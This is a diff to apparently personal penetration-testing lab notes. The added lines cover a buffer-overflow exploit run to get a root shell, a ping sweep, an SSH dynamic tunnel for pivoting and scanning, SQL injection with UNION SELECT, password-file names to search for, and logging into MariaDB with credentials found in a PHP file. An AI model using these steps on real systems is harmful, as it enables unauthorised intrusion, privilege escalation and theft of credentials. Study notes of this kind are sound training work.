@@ -27,7 +27,7 @@ STEP 2
 
 
 STEP 3
-Exploit Development on Dry Run issues
+Exploit Development on Dry Run 
 
 - shebang --> (#!/usr/bin/python)
 - first build offset --> offset -"A" * 100
@@ -78,8 +78,14 @@ Exploit Development on Dry Run issues
 - now go back to user2/target shell and run the script
 - sudo ./exploit_me $(python linbuf.py)
 - or just try ./exploit_me $(python linbuf.py)
+- this will now put you into root shell in this scenario.
 
-
+Step 4
+- going back to the user2 shell. if we run the for script we can see other ips that could be of interest. 
+- or i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+- now we can make a dynamic tunnel as an extension of our last tunnel so we can nmap scan these new ips.
+- ssh -S /tmp/jmp ANYTHING -O forward -D 9050
+- 
 
 
 
@@ -200,3 +206,6 @@ from <URL>/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.
 
 notable mentions that you should consider:
 Passwd.txt Passwds.txt passwd.txt password.txt passwords.txt 
+
+On the occasion that in one of the .php files you find a mysql user and pass. You can use it and go into mariadb. In this case it was in login.php and looked like this. $con = mysqli_connect('localhost:3306','webuser','sqlpass','session')
+With this we can run a command from our shell to open mariadb mysql --user=webuser --pass=sqlpass
